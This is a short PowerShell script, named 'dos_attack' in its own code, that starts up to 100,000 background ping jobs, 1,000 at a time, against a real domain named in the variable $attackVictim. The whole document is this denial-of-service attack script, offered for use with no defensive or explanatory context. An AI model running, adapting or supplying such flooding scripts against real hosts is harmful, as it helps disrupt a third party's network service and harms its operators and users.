$numberOfPings = 0;
$maxNumberOfPings = 100000;
$maxConcurrentPings = 1000;
$nameOfPingJob = 'dos_attack';
$attackVictim = 'nspk.com';

while($numberOfPings -lt $maxNumberOfPings)
{
    $jobsCount = (Get-Job | where { $_.Name -eq $nameOfPingJob -and $_.State -eq 'Running' }).Count

    if($jobsCount -lt $maxConcurrentPings)
    {
        Start-Job -ScriptBlock { ping $args[0] } -ArgumentList $attackVictim -Name $nameOfPingJob | Out-Null
        
        $numberOfPings = $numberOfPings + 1

        echo "Started no. $($numberOfPings) job"
    }
}
